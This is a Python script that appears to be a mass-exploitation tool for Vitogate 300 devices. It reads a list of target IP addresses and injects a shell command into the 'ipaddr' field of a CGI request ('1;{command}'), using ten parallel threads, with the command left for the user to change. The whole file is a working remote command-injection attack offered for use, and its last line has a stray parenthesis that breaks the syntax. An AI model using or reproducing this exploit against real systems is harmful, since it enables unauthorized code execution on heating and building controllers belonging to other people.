# Made By NRPE | Vitogate 300 #
import concurrent.futures
import os
import requests
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def send_da_hacks(ip, port, command):
    url = f"http://{ip}:{port}/cgi-bin/vitogate.cgi"
    payload = {
        "method": "put",
        "form": "form-4-8",
        "session": "",
        "params": {
            "ipaddr": f"1;{command}"
        }
    }
    headers = {
        "Host": ip,
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, verify=False, timeout=3)
        if response.status_code == 200:
            logging.info(f"{ip}:{port} - Exploit sent")
            return True
        else:
            logging.warning(f"{ip}:{port} - Failed: {response.status_code}")
            return False
    except requests.RequestException as e:
        logging.error(f"{ip}:{port} - Error: {e}")
        return False

def main(ip_list, port, command):
    if not os.path.exists(ip_list):
        logging.error(f"File {ip_list} not found")
        return
    
    with open(ip_list, 'r') as file:
        ips = [line.strip() for line in file if line.strip()]
    
    if not ips:
        logging.warning("IP list is empty")
        return
    
    success_count = 0
    failure_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_da_hacks, ip, port, command): ip for ip in ips}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                success_count += 1
            else:
                failure_count += 1
    
    logging.info(f"Complete: {success_count} succeeded, {failure_count} failed")

if __name__ == "__main__":
    ip_list = "list.txt"
    port = 80
    command = "id"  # change this
    main(ip_list, port, command))
